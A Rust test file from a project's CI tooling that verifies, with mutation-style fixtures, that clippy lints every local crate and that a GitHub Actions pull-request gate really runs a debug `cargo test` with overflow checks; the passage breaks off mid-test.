/// The crates the root manifest reaches by a path inside this tree,
/// and the directories of the workspace members, as `cargo metadata`
/// reports them. Cargo is the oracle for what clippy will reach, rather
/// than a reading of `[workspace]` here that could disagree with it.
///
/// `--no-deps` resolves nothing, so it needs no registry and runs the
/// same offline on every host; it also lists members only, which is why
/// the local crates are found from the manifest's `path = "..."` values
/// (every one naming a directory that holds a `Cargo.toml`).
fn local_crates_and_members() -> (Vec<PathBuf>, Vec<PathBuf>) {
    let root = manifest_dir();
    let manifest = read_or_panic(&root.join("Cargo.toml"));
    let mut local: Vec<PathBuf> = vec![root.clone()];
    for line in manifest.lines() {
        let line = line.split('#').next().unwrap_or_default();
        for piece in line.split("path").skip(1) {
            let Some(value) = piece.trim_start().strip_prefix('=') else {
                continue;
            };
            let Some(value) = value.trim_start().strip_prefix('"') else {
                continue;
            };
            let dir = value.split('"').next().unwrap_or_default();
            if dir.starts_with("..") || !root.join(dir).join("Cargo.toml").is_file() {
                continue;
            }
            local.push(root.join(dir));
        }
    }
    let output = std::process::Command::new("cargo")
        .args([
            "metadata",
            "--no-deps",
            "--offline",
            "--format-version",
            "1",
        ])
        .arg("--manifest-path")
        .arg(root.join("Cargo.toml"))
        .output()
        .unwrap_or_else(|e| panic!("cannot run `cargo metadata`: {e}"));
    assert!(
        output.status.success(),
        "`cargo metadata` failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let text = String::from_utf8(output.stdout).expect("cargo metadata prints UTF-8");
    // JSON is YAML 1.2, so the parser this file already uses reads it.
    let documents = Yaml::load_from_str(&text).expect("cargo metadata prints JSON");
    let metadata = documents.first().expect("cargo metadata prints a document");
    let members = field(metadata, "packages")
        .and_then(Yaml::as_sequence)
        .expect("cargo metadata has a `packages` list")
        .iter()
        .filter_map(|package| field(package, "manifest_path").and_then(Yaml::as_str))
        .filter_map(|path| Path::new(path).parent().map(Path::to_path_buf))
        .collect();
    (local, members)
}

/// THE CLIPPY GATE COVERS EVERY CRATE IN THIS TREE (#410).
///
/// The same gap as #367, for clippy: `tests/support` was a path
/// dependency and not a workspace member, and clippy lints members
/// only, so no flag on the root invocation reached it and a finding in
/// it sat on `main` with the gate green. Both halves are needed: every
/// local crate a member, and a `chore lint` clippy run over the whole
/// workspace.
#[test]
fn the_lint_clippy_check_covers_every_local_crate() {
    let chores = read_or_panic(&manifest_dir().join("chores.yml"));
    let (checks, missing_workspace) = lint_clippy_checks(&chores);
    assert!(
        !checks.is_empty(),
        "`chore lint` runs no gating `cargo clippy ... -- -D warnings`, so nothing lints at all"
    );
    assert!(
        missing_workspace.is_empty(),
        "`chore lint` runs clippy without `--workspace`, which lints the root package only: \
         {missing_workspace:?}"
    );
    let (local, members) = local_crates_and_members();
    let outside: Vec<&PathBuf> = local.iter().filter(|dir| !members.contains(dir)).collect();
    assert!(
        local.len() > 1,
        "cargo metadata reports {local:?} as the local packages; tests/support is missing, \
         so this check would pass having looked at nothing"
    );
    assert!(
        outside.is_empty(),
        "local crates that are not workspace members, which clippy never lints: {outside:?}"
    );
}

mod lint_clippy {
    use super::lint_clippy_checks;

    fn lint(cmds: &str) -> (Vec<String>, Vec<String>) {
        lint_clippy_checks(&format!("tasks:\n  lint:\n    cmds:\n{cmds}"))
    }

    #[test]
    fn a_run_over_the_root_package_only_is_refused() {
        let (checks, missing) =
            lint("      - cargo clippy --locked --all-targets -- -D warnings\n");
        assert_eq!(checks, vec!["cargo clippy --locked --all-targets"]);
        assert_eq!(missing, checks);
    }

    #[test]
    fn a_run_over_the_workspace_is_accepted() {
        let (checks, missing) =
            lint("      - cargo clippy --locked --workspace --all-targets -- -D warnings\n");
        assert_eq!(checks.len(), 1);
        assert!(missing.is_empty());
    }

    /// Past `--` the words are clippy's lint flags, and select nothing.
    #[test]
    fn a_workspace_handed_to_clippy_does_not_count() {
        let (_, missing) = lint("      - cargo clippy -- -D warnings --workspace\n");
        assert_eq!(missing.len(), 1);
    }

    /// A run that only warns gates nothing, so it is not a check.
    #[test]
    fn a_run_that_does_not_deny_warnings_is_not_a_check() {
        let (checks, _) = lint("      - cargo clippy --workspace\n");
        assert!(checks.is_empty());
        let (checks, _) = lint("      - cargo clippy --workspace -- -Dwarnings\n");
        assert_eq!(checks.len(), 1);
    }

    #[test]
    fn a_run_whose_failure_is_ignored_does_not_count() {
        let (checks, _) = lint(
            "      - cmd: cargo clippy --workspace -- -D warnings\n        ignore_error: true\n",
        );
        assert!(checks.is_empty());
    }
}

/// Whether the step's result is READ, which the line-based parser
/// above cannot see. Six conditions, each with its own test, plus a
/// control asserting the unmodified shape IS counted so the others
/// cannot pass for the wrong reason.
mod gating {
    use super::gating_checking_debug_runs as gating;

    /// The shape that does gate. Every test below is this with one
    /// thing changed, so a failure here means the fixture is wrong
    /// rather than the property.
    const GATING: &str = "\
on:
  pull_request:
    branches: [main]
jobs:
  test:
    steps:
      - run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib
";

    const STEP: &str = "      - run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib\n";

    /// THE MESSAGE NAMES THE CAUSE (#155). A workflow that stopped
    /// triggering on pull requests is reported as that, with the triggers
    /// it has, and not as a missing debug step. The control is the gating
    /// shape, which has nothing to explain.
    #[test]
    fn a_workflow_off_pull_requests_is_reported_by_its_trigger() {
        assert_eq!(super::not_a_pull_request_gate(GATING), None, "control");
        for (trigger, names_target) in [
            ("pull_request_target", true),
            ("pull_request_review", false),
            ("push", false),
        ] {
            let yaml = GATING.replace("  pull_request:\n", &format!("  {trigger}:\n"));
            assert_ne!(yaml, GATING, "the mutation must actually apply");
            let why = super::not_a_pull_request_gate(&yaml)
                .unwrap_or_else(|| panic!("{trigger}: no reason given"));
            assert!(
                why.contains(&format!("{trigger:?}")) && why.contains("`on:` block"),
                "{trigger}: the message must name the trigger found and the on: block: {why}"
            );
            assert_eq!(
                why.contains("refused on purpose"),
                names_target,
                "{trigger}: only pull_request_target gets the refusal explained: {why}"
            );
        }
    }

    #[test]
    fn the_control_shape_gates() {
        assert_eq!(
            gating(GATING).len(),
            1,
            "the control must be counted, or every test below passes for the wrong reason"
        );
    }

    #[test]
    fn a_step_carrying_if_does_not_gate() {
        for condition in [
            "if: false",
            "if: ${{ false }}",
            "if: github.event_name == 'push'",
            "if: ${{ env.SOMETHING == 'yes' }}",
        ] {
            let yaml = GATING.replace(STEP, &format!("{STEP}        {condition}\n"));
            assert_ne!(yaml, GATING, "the mutation must actually apply");
            assert!(
                gating(&yaml).is_empty(),
                "a step carrying `{condition}` may or may not run, so it cannot be what \
                 makes the gate able to see an overflow. Rejected on the key's presence \
                 rather than by evaluating it -- the spellings are open-ended."
            );
        }
    }

    #[test]
    fn a_step_carrying_continue_on_error_does_not_gate() {
        let yaml = GATING.replace(STEP, &format!("{STEP}        continue-on-error: true\n"));
        assert_ne!(yaml, GATING, "the mutation must actually apply");
        assert!(
            gating(&yaml).is_empty(),
            "the step runs and its failure is discarded, which is this project's own \
             named defect: a step that runs and whose result nothing reads"
        );
    }

    #[test]
    fn a_job_carrying_if_does_not_gate() {
        let yaml = GATING.replace("  test:\n", "  test:\n    if: false\n");
        assert_ne!(yaml, GATING, "the mutation must actually apply");
        assert!(
            gating(&yaml).is_empty(),
            "the same reasoning one level up: a job that may not run cannot gate"
        );
    }

    #[test]
    fn a_job_carrying_continue_on_error_does_not_gate() {
        let yaml = GATING.replace("  test:\n", "  test:\n    continue-on-error: true\n");
        assert_ne!(yaml, GATING, "the mutation must actually apply");
        assert!(
            gating(&yaml).is_empty(),
            "a job whose failure is discarded cannot gate, however sound its steps"
        );
    }

    /// The assumption the `ci.yml`-only scope rests on, which is a
    /// fact about the file rather than a given.
    #[test]
    fn a_workflow_that_no_longer_runs_on_pull_request_does_not_gate() {
        let yaml = GATING.replace(
            "  pull_request:\n    branches: [main]\n",
            "  push:\n    branches: [main]\n",
        );
        assert_ne!(yaml, GATING, "the mutation must actually apply");
        assert!(
            gating(&yaml).is_empty(),
            "scoping the scan to ci.yml assumes ci.yml is what runs on a pull request; \
             if its triggers stop including pull_request, the step gates nothing no \
             matter how it looks"
        );
    }

    /// `pull_request_target` ALONE IS NOT A PULL-REQUEST GATE, and
    /// `runs_on_pull_request` does not count it: it compares each
    /// parsed trigger name against `pull_request` and nothing else.
    ///
    /// Such a workflow runs in the base repository's context and checks
    /// out the base ref by default, so it may never build the
    /// contributor's code (#149). Replacing `pull_request:` with
    /// `pull_request_target:` is a defeat of the gate, and this test is
    /// what kills that mutation.
    #[test]
    fn a_pull_request_target_trigger_alone_does_not_gate() {
        let yaml = GATING.replace("  pull_request:\n", "  pull_request_target:\n");
        assert_ne!(yaml, GATING, "the mutation must actually apply");
        assert!(
            gating(&yaml).is_empty(),
            "pull_request_target runs against the BASE repository with a write token and \
             the repository's secrets, and checks out the base ref by default, so a \
             workflow triggered only that way may never build the contributor's code. \
             It is not proof that the merge is gated. See rust-fs-ext4#149."
        );
    }

    /// THE CONTROL THAT STOPS THE REFUSAL OVER-CORRECTING.
    ///
    /// Carrying both triggers is the ordinary way to reach secrets
    /// without giving up the gate, and such a workflow IS gated -- by
    /// its `pull_request:` key, which the refusal above must not
    /// disturb. Without this test, narrowing the comparison to
    /// `t == "pull_request" && !any(t == "pull_request_target")` would
    /// pass every other assertion in this file while refusing a
    /// perfectly gated workflow. Contributed by the branch this change
    /// supersedes; it is the arm that branch added and the reason to
    /// keep it whatever the parser looks like.
    #[test]
    fn a_workflow_carrying_both_triggers_still_gates() {
        let yaml = GATING.replace(
            "  pull_request:\n",
            "  pull_request:\n  pull_request_target:\n",
        );
        assert_ne!(yaml, GATING, "the mutation must actually apply");
        assert_eq!(
            gating(&yaml).len(),
            1,
            "the workflow still triggers on pull_request, so it still gates; refusing it \
             would be the over-correction"
        );
    }

    /// A `#` inside a quoted shell value is content, not a comment.
    ///
    /// This is what `without_comment` defended, and it is the reason
    /// that helper existed: a hand-rolled scanner has to decide where
    /// a comment starts, and its own doc conceded the rule was "crude
    /// next to real YAML". The parser decides it by the grammar --
    /// inside a quoted scalar a `#` is simply a character -- so the
    /// property is asserted here rather than left to a heuristic.
    #[test]
    fn a_hash_inside_a_quoted_value_is_content_not_a_comment() {
        let yaml = GATING.replace(
            "      - run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib\n",
            "      - run: echo '#1'; EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib\n",
        );
        assert_ne!(yaml, GATING, "the mutation must actually apply");
        assert_eq!(
            gating(&yaml).len(),
            1,
            "the `#` is inside a quoted shell string, so the command after it is still \
             the command; treating it as a comment would refuse a correct workflow"
        );
    }

    /// A workflow the parser cannot read is a failure, never a pass.
    ///
    /// The direction matters: swallowing the error and returning an
    /// empty structure would report "no debug run gates this", which is
    /// also a failure and therefore safe -- but returning early with a
    /// pass would be the blindness this module exists to refuse.
    #[test]
    #[should_panic(expected = "not valid YAML")]
    fn a_workflow_that_does_not_parse_is_a_failure() {
        super::parse_workflow("jobs:\n  test:\n   - broken: [unclosed\n");
    }

    /// THE OTHER DIRECTION, which is the one that costs something.
    ///
    /// A step's `env:` mapping says nothing about whether its result
    /// is read, so it must NOT disqualify the step. Over-strictness
    /// here would be self-defeating: the handshake this guard looks
    /// for is itself an environment variable, and a maintainer moving
    /// it into a mapping would turn the guard red on a workflow that
    /// gates perfectly well. Pinned so a later tightening of the
    /// non-gating key list cannot quietly swallow it.
    #[test]
    fn a_step_carrying_an_env_mapping_still_gates() {
        let yaml = GATING.replace(
            STEP,
            "      - env:\n          CARGO_TERM_COLOR: always\n        run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib\n",
        );
        assert_ne!(yaml, GATING, "the mutation must actually apply");
        assert_eq!(
            gating(&yaml).len(),
            1,
            "an `env:` mapping is not a condition and does not discard a result, so the \
             step still gates. Rejecting it would be over-strict in the one direction \
             that breaks a working workflow."
        );
    }

    /// A TRAILING COMMENT ON THE JOB LINE MUST NOT LOSE THE JOB.
    ///
    /// The job header is recognised by its line ending in a colon, and
    /// `  test:  # the gate` does not -- so the job's steps were never
    /// collected and the guard reported that nothing gates. Loud
    /// rather than silent, but wrong, and on a workflow that gates
    /// perfectly well. The over-strict direction is the safe one for a
    /// CONDITION; it is not safe for a comment.
    #[test]
    fn a_job_line_with_a_trailing_comment_still_gates() {
        let yaml = GATING.replace("  test:\n", "  test:  # the pull-request gate\n");
        assert_ne!(yaml, GATING, "the mutation must actually apply");
        assert_eq!(
            gating(&yaml).len(),
            1,
            "a comment after the job's name says nothing about whether its result is read"
        );
    }

    /// A COMMENT IS NOT A TRIGGER. The substring search this replaced
    /// answered `true` for the comment that says the trigger was
    /// switched off, which is the most likely place the word appears
    /// on a workflow that no longer gates.
    #[test]
    fn a_commented_out_pull_request_trigger_does_not_gate() {
        for spelling in [
            "  push:\n    branches: [main]\n  # pull_request disabled for now\n",
            "  push:\n    branches: [main]\n    # was: pull_request\n",
            "  push: # replaces pull_request\n    branches: [main]\n",
        ] {
            let yaml = GATING.replace("  pull_request:\n    branches: [main]\n", spelling);
            assert_ne!(yaml, GATING, "the mutation must actually apply");
            assert!(
                yaml.contains("pull_request"),
                "precondition: the word must still be PRESENT, or this tests nothing -- \
                 the whole point is text that mentions it while not triggering on it"
            );
            assert!(
                gating(&yaml).is_empty(),
                "a workflow whose only mention of pull_request is a comment gates \
                 nothing. Spelling: {spelling:?}"
            );
        }
    }

    /// A DIFFERENT TRIGGER THAT STARTS THE SAME WAY IS A DIFFERENT
    /// TRIGGER. `pull_request_review` fires on review events, not on a
    /// pull request opening or being pushed to, so a step under it
    /// cannot be what gates the pull request.
    ///
    /// This is why the check compares whole trigger names rather than
    /// matching a prefix.
    #[test]
    fn a_similarly_named_trigger_does_not_gate() {
        for trigger in [
            "pull_request_review",
            "pull_request_review_comment",
            "pull_requests",
        ] {
            let yaml = GATING.replace("  pull_request:\n", &format!("  {trigger}:\n"));
            assert_ne!(yaml, GATING, "the mutation must actually apply");
            assert!(
                gating(&yaml).is_empty(),
                "`{trigger}` is not `pull_request`, so it must not be counted as one"
            );
        }
    }

    /// A QUOTED KEY IS THE SAME KEY. `"if": false` is valid YAML and
    /// GitHub Actions honours it exactly as `if: false`, but a raw
    /// text compare against `if` matched neither quoted spelling -- so
    /// a step that does not gate was counted as one that does.
    ///
    /// This file's manifest parser already normalises quotes, after a
    /// quoted `"overflow-checks" = false` defeated that scan. Same
    /// defect one format across.
    #[test]
    fn a_quoted_non_gating_key_still_does_not_gate() {
        for key in [
            "\"if\": false",
            "'if': false",
            "\"continue-on-error\": true",
            "'continue-on-error': true",
        ] {
            let yaml = GATING.replace(STEP, &format!("{STEP}        {key}\n"));
            assert_ne!(yaml, GATING, "the mutation must actually apply");
            assert!(
                gating(&yaml).is_empty(),
                "a step carrying `{key}` does not gate, and the quotes do not change that"
            );
        }
    }

    /// The same, one level up, where the job-level key extraction had
    /// the identical bypass.
    #[test]
    fn a_quoted_non_gating_key_on_the_job_still_does_not_gate() {
        for key in ["\"if\": false", "'continue-on-error': true"] {
            let yaml = GATING.replace("  test:\n", &format!("  test:\n    {key}\n"));
            assert_ne!(yaml, GATING, "the mutation must actually apply");
            assert!(
                gating(&yaml).is_empty(),
                "a job carrying `{key}` does not gate, quoted or not"
            );
        }
    }

    /// EVERY BLOCK-SCALAR SPELLING IS A BLOCK. `|` is not the only
    /// one: YAML's chomping and indentation indicators all open a
    /// block, and treating one as the command itself meant the block's
    /// contents were never read -- so changing `|` to `|-`, which
    /// preserves behaviour, made the guard report that nothing gated.
    #[test]
    fn a_run_block_is_read_whole_in_every_block_scalar_spelling() {
        for indicator in ["|", "|-", "|+", ">", ">-", ">+", "|2", ">2-"] {
            let yaml = format!(
                "on:\n  pull_request:\n    branches: [main]\njobs:\n  test:\n    steps:\n\
                 {}      - name: a block\n        run: {indicator}\n          set -euo pipefail\n\
                 {}          EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib\n",
                "", ""
            );
            assert_eq!(
                gating(&yaml).len(),
                1,
                "`run: {indicator}` opens a block, so the command inside it must be seen"
            );
        }
    }

    /// The flow-sequence and single-scalar spellings of `on:`, which
    /// put the triggers on the same line rather than in a block.
    #[test]
    fn the_inline_trigger_spellings_are_read_too() {
        let base = GATING.replace("on:\n  pull_request:\n    branches: [main]\n", "");
        for (spelling, gates) in [
            ("on: [push, pull_request]\n", true),
            ("on: [push]\n", false),
            ("on: pull_request\n", true),
            ("on: push\n", false),
            ("on:\n  - push\n  - pull_request\n", true),
            ("on:\n  - push\n", false),
        ] {
            let yaml = format!("{spelling}{base}");
            assert_eq!(
                !gating(&yaml).is_empty(),
                gates,
                "`{spelling:?}` should {} gate",
                if gates { "" } else { "not" }
            );
        }
    }

    /// A `run: |` block is read whole, so a command inside a shell
    /// loop is visible rather than seen as fragments.
    #[test]
    fn a_run_block_is_read_whole() {
        let yaml = "\
on:
  pull_request:
    branches: [main]
jobs:
  test:
    steps:
      - name: a block
        run: |
          set -euo pipefail
          EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib
";
        assert_eq!(
            gating(yaml).len(),
            1,
            "a command inside a `run: |` block must be seen; several steps in this \
             repository's ci.yml are blocks like this one"
        );
    }

    /// The real `ci.yml` gates, read through the same function the
    /// guard uses. Distinct from the guard's own assertion: this one
    /// proves the PARSER copes with the real file's shape -- matrix
    /// strategies, `uses:`/`with:` mappings, comments between steps --
    /// rather than only with the fixtures above.
    #[test]
    fn the_real_ci_yml_still_parses_into_a_gating_step() {
        let workflow = super::read_or_panic(
            &super::manifest_dir()
                .join(".github")
                .join("workflows")
                .join("ci.yml"),
        );
        let chores = super::read_or_panic(&super::manifest_dir().join("chores.yml"));
        assert!(
            !super::gating_checking_debug_runs_via_chore(&workflow, &chores).is_empty(),
            "the real ci.yml must parse into at least one gating step, or the guard is \
             passing on a fixture and failing on the file it exists to read"
        );
    }
}

/// Following `chore <task>` into chores.yml: what resolves, and what a
/// task or a command item carries that stops it gating. Every test is
/// [`WORKFLOW`] and [`CHORES`] with one thing changed.
mod chore {
    use super::gating_checking_debug_runs_via_chore as gating;

    const WORKFLOW: &str = "\
on:
  pull_request:
    branches: [main]
jobs:
  unit:
    steps:
      - name: chore test:unit
        run: chore test:unit
";

    const CHORES: &str = "\
version: '3'
tasks:
  test:unit:
    cmds:
      - 'EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib'
  test:
    cmds:
      - task: test:unit
      - cargo test --locked --release
";

    const UNIT_CMDS: &str =
        "    cmds:\n      - 'EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib'\n";

    #[test]
    fn a_chore_step_resolving_to_a_checking_debug_run_gates() {
        assert_eq!(
            gating(WORKFLOW, CHORES),
            vec!["chore test:unit: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib".to_string()],
            "the control must be counted, or every test below passes for the wrong reason"
        );
    }

    #[test]
    fn a_chore_step_reaching_the_run_through_a_nested_task_gates() {
        let workflow = WORKFLOW.replace("run: chore test:unit", "run: chore test");
        assert_ne!(workflow, WORKFLOW, "the mutation must actually apply");
        assert_eq!(
            gating(&workflow, CHORES),
            vec![
                "chore test -> test:unit: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib"
                    .to_string()
            ],
            "`task: test:unit` runs the task, so its run is the step's run"
        );
    }

    #[test]
    fn a_chore_step_with_arguments_after_the_task_still_resolves() {
        for line in [
            "chore test:unit --force",
            "chore test:unit -- --nocapture",
            "CARGO_TERM_COLOR=always chore test:unit",
            "set -eu; chore test:unit --force",
            "~/.local/bin/chore test:unit  # the unit tier",
        ] {
            let workflow = WORKFLOW.replace("run: chore test:unit", &format!("run: {line}"));
            assert_ne!(workflow, WORKFLOW, "the mutation must actually apply");
            assert_eq!(
                gating(&workflow, CHORES).len(),
                1,
                "`{line}` runs test:unit"
            );
        }
    }

    /// chore may SKIP a task that carries any of these as up to date, and
    /// an up-to-date skip is a green step. Presence, not value.
    #[test]
    fn a_task_chore_may_skip_as_up_to_date_does_not_gate() {
        for key in [
            "sources: [src/lib.rs]",
            "generates: [target/done]",
            "status: ['true']",
            "sources: []",
        ] {
            let chores = CHORES.replace(UNIT_CMDS, &format!("    {key}\n{UNIT_CMDS}"));
            assert_ne!(chores, CHORES, "the mutation must actually apply");
            assert!(
                gating(WORKFLOW, &chores).is_empty(),
                "a task carrying `{key}` may be skipped as up to date, so its run cannot be \
                 what makes the gate see an overflow"
            );
        }
    }

    /// The same, on a task ON THE PATH rather than the one holding the run.
    #[test]
    fn a_skippable_task_on_the_path_does_not_gate() {
        let workflow = WORKFLOW.replace("run: chore test:unit", "run: chore test");
        let chores = CHORES.replace(
            "  test:\n    cmds:\n",
            "  test:\n    sources: [Cargo.toml]\n    cmds:\n",
        );
        assert_ne!(chores, CHORES, "the mutation must actually apply");
        assert_eq!(gating(&workflow, CHORES).len(), 1, "control");
        assert!(
            gating(&workflow, &chores).is_empty(),
            "if `test` is skipped, the `test:unit` it would have run is skipped too"
        );
    }

    #[test]
    fn a_cmd_carrying_ignore_error_does_not_gate() {
        let chores = CHORES.replace(
            "      - 'EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib'\n",
            "      - cmd: 'EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib'\n        ignore_error: true\n",
        );
        assert_ne!(chores, CHORES, "the mutation must actually apply");
        assert!(
            gating(WORKFLOW, &chores).is_empty(),
            "a command whose failure chore ignores is a run whose result nothing reads"
        );

        // The control: the same mapping spelling, without the key, gates.
        let control = chores.replace("        ignore_error: true\n", "");
        assert_eq!(
            gating(WORKFLOW, &control).len(),
            1,
            "a `cmd:` mapping is a command"
        );

        // And on the `task:` item that reaches it.
        let workflow = WORKFLOW.replace("run: chore test:unit", "run: chore test");
        let chores = CHORES.replace(
            "      - task: test:unit\n",
            "      - task: test:unit\n        ignore_error: false\n",
        );
        assert_ne!(chores, CHORES, "the mutation must actually apply");
        assert!(
            gating(&workflow, &chores).is_empty(),
            "`ignore_error: false` too: the key's presence, not its value"
        );
    }

    #[test]
    fn a_chore_step_carrying_if_still_does_not_gate() {
        let workflow = WORKFLOW.replace(
            "        run: chore test:unit\n",
            "        run: chore test:unit\n        if: false\n",
        );
        assert_ne!(workflow, WORKFLOW, "the mutation must actually apply");
        assert!(
            gating(&workflow, CHORES).is_empty(),
            "resolving the task happens only for a step that gates"
        );
    }

    #[test]
    fn a_chore_line_that_is_a_comment_or_inverted_does_not_resolve() {
        for run in [
            "run: |\n          # chore test:unit\n          echo nothing",
            "run: '! chore test:unit'",
            "run: echo chore test:unit",
        ] {
            let workflow = WORKFLOW.replace("run: chore test:unit", run);
            assert_ne!(workflow, WORKFLOW, "the mutation must actually apply");
            assert!(
                gating(&workflow, CHORES).is_empty(),
                "`{run}` does not run test:unit and require it to pass"
            );
        }
    }

    #[test]
    #[should_panic(
        expected = "`chore test:unti` (from a workflow step) names no task in chores.yml"
    )]
    fn a_chore_step_naming_a_task_that_does_not_exist_panics() {
        gating(
            &WORKFLOW.replace("chore test:unit", "chore test:unti"),
            CHORES,
        );
    }

    #[test]
    #[should_panic(expected = "`chore test:unti` (from test) names no task in chores.yml")]
    fn a_task_item_naming_a_task_that_does_not_exist_panics() {
        gating(
            &WORKFLOW.replace("run: chore test:unit", "run: chore test"),
            &CHORES.replace("- task: test:unit", "- task: test:unti"),
        );
    }

    /// A cycle is chore's error to report; the guard must just not hang.
    #[test]
    fn a_task_cycle_terminates() {
        let chores = format!("{CHORES}  a:\n    cmds:\n      - task: b\n      - task: test:unit\n  b:\n    cmds:\n      - task: a\n");
        let workflow = WORKFLOW.replace("run: chore test:unit", "run: chore a");
        assert_eq!(gating(&workflow, &chores).len(), 1);
    }

    /// `scripts/test.sh` is read as `cargo test`, which is only true while
    /// it ends by handing cargo every argument it was given. It may run
    /// cargo inside the harness's `vm.sh session`, which runs the command
    /// it is given as it is, arguments and status included; that prefix,
    /// spelled exactly so, is the only thing allowed in front of cargo.
    #[test]
    fn scripts_test_sh_is_still_cargo_test_with_its_arguments() {
        const SESSION: &str = "${session[@]+\"${session[@]}\"} ";
        let script = super::read_or_panic(&super::manifest_dir().join(super::TEST_WRAPPER));
        let last = script
            .lines()
            .map(str::trim)
            .rfind(|line| !line.is_empty() && !line.starts_with('#'))
            .map(|line| line.strip_prefix(SESSION).unwrap_or(line));
        assert_eq!(
            last,
            Some("cargo test --features cli \"$@\""),
            "{} no longer ends in `cargo test --features cli \"$@\"`, so \
             checking_debug_runs must stop reading it as `cargo test`",
            super::TEST_WRAPPER
        );
        let chores = CHORES.replace(
            "cargo test --locked --lib",
            "scripts/test.sh --locked --lib",
        );
        assert_eq!(
            gating(WORKFLOW, &chores).len(),
            1,
            "the wrapper in debug gates"
        );
        for release in ["--release --lib", "-r --lib"] {
            let chores = CHORES.replace(
                "cargo test --locked --lib",
                &format!("scripts/test.sh --locked {release}"),
            );
            assert!(
                gating(WORKFLOW, &chores).is_empty(),
                "the wrapper with `{release}` is release"
            );
        }
    }

    fn real(path: &[&str]) -> String {
        let mut full = super::manifest_dir();
        full.extend(path);
        super::read_or_panic(&full)
    }

    /// THE GUARD BITES ON THE REAL FILES, mutated in memory.
    ///
    /// Note what it takes: dropping the `unit` job's `chore test:unit` is
    /// NOT enough on its own, because the `test` job's `chore test` runs
    /// `task: test:unit` as well -- in debug, with the handshake -- so the
    /// PR gate still sees an overflow, on both architectures. Only both
    /// gone, or the handshake gone from the task, or the task made
    /// skippable, leaves nothing.
    #[test]
    fn the_real_files_stop_gating_when_the_run_is_removed() {
        let workflow = real(&[".github", "workflows", "ci.yml"]);
        let chores = real(&["chores.yml"]);
        assert!(!gating(&workflow, &chores).is_empty(), "control");

        let no_unit_step = workflow.replace("run: chore test:unit\n", "run: 'true'\n");
        assert_ne!(no_unit_step, workflow, "the mutation must actually apply");
        assert!(
            gating(&no_unit_step, &chores)
                .iter()
                .all(|run| run.starts_with("chore test -> test:unit: ")),
            "without the unit job's step, only `chore test` reaches the run"
        );
        let neither = no_unit_step.replace("run: chore test\n", "run: 'true'\n");
        assert_ne!(neither, no_unit_step, "the mutation must actually apply");
        assert!(
            gating(&neither, &chores).is_empty(),
            "no step reaches test:unit"
        );

        let no_handshake = chores.replace("EXPECT_OVERFLOW_CHECKS=1 ", "");
        assert_ne!(no_handshake, chores, "the mutation must actually apply");
        assert!(
            gating(&workflow, &no_handshake).is_empty(),
            "test:unit without EXPECT_OVERFLOW_CHECKS=1 asks the build nothing"
        );

        let skippable = chores.replace(
            "  test:unit:\n",
            "  test:unit:\n    sources: ['src/**/*.rs']\n",
        );
        assert_ne!(skippable, chores, "the mutation must actually apply");
        assert!(
            gating(&workflow, &skippable).is_empty(),
            "a test:unit chore may skip as up to date gates nothing"
        );
    }
}

/// The parser is the part of this that can rot, checked against each
/// shape it has to tell apart.
mod parser {
    use super::checking_debug_runs;

    /// The trap this repository's own `ci.yml` contains: the debug
    /// command quoted verbatim in the comment explaining the step.
    /// `-r` IS `--release`, IN EVERY SPELLING CLAP ACCEPTS (#158). Each of
    /// these compiles with overflow checks off and counted as the debug
    /// run; the controls beside them are not release and still count.
    #[test]
    fn the_short_release_flag_does_not_count_in_any_spelling() {
        for line in [
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked -r --all-targets",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked -qr --all-targets",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked -rq --all-targets",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked -j4 -r",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked -j 4 -r --lib",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --features x -r",
            "EXPECT_OVERFLOW_CHECKS=1 /usr/bin/cargo test --locked -r --lib",
            "EXPECT_OVERFLOW_CHECKS=1 cargo +1.95.0 test --locked -r --lib",
            "true&&EXPECT_OVERFLOW_CHECKS=1 cargo test --locked -r --lib",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib 2>&1 -r",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --features 'a;b' -r",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --features \"a&&b\" -r",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --features a\\;b -r",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked '-r'",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked \"-qr\"",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked \\-r",
        ] {
            assert_eq!(
                checking_debug_runs(line),
                Vec::<String>::new(),
                "{line} builds the release profile"
            );
        }
        for line in [
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --all-targets -- -r",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --features r",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked -F r",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked -pr --lib",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked -j r --lib",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib && rm -rf build",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib; echo -r",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib&&rm -rf build",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib;echo -r",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib|tee -r",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked -- '-r'",
            "EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib && echo 'cargo test -r'",
        ] {
            assert_eq!(
                checking_debug_runs(line).len(),
                1,
